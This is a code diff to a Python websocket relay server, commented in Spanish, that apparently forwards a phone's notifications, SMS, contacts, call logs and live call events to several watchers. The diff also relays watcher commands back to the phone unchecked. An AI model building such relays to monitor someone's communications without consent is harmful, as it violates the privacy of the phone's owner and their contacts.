@@ -229,8 +229,10 @@ async def handle(request):
                     #   NOTIF|     → notificaciones de apps en Beta
                     #   CALL_EVENT|→ eventos de llamada en tiempo real
                     #   SMS_IN|    → SMS entrante en tiempo real
-                    if (txt.startswith("INFO|") or txt.startswith("NOTIF|")
-                            or txt.startswith("CALL_EVENT|") or txt.startswith("SMS_IN|")):
+                    # Mensajes que van a listener Y a todos los watchers
+                    BROADCAST = ("INFO|", "NOTIF|", "CALL_EVENT|", "SMS_IN|",
+                                 "CONTACTS|", "SMS_HISTORY|", "CALL_LOG|")
+                    if any(txt.startswith(p) for p in BROADCAST):
                         if txt.startswith("INFO|"):
                             last_info[code] = txt
                         alpha = listeners.get(code)
@@ -244,7 +246,7 @@ async def handle(request):
                                 dead.add(w)
                         watchers.get(code, set()).difference_update(dead)
                     else:
-                        # Respuestas a comandos (SMS_HISTORY, CONTACTS, etc.) → solo al listener
+                        # Otros mensajes → solo al listener
                         alpha = listeners.get(code)
                         if alpha is not None and not alpha.closed:
                             await safe_str(alpha, txt)
@@ -347,7 +349,14 @@ async def handle(request):
             if beta is not None and not beta.closed:
                 await safe_str(beta, "GET_INFO")
             async for msg in ws:
-                if msg.type in (
+                if msg.type == aiohttp.WSMsgType.TEXT:
+                    # Comandos del watcher → reenviar a Beta
+                    txt = msg.data.strip()
+                    beta = emitters.get(code)
+                    if beta is not None and not beta.closed:
+                        await safe_str(beta, txt)
+                        log(code, f"Watcher→Beta: {txt}")
+                elif msg.type in (
                     aiohttp.WSMsgType.CLOSE,
                     aiohttp.WSMsgType.CLOSED,
                     aiohttp.WSMsgType.ERROR
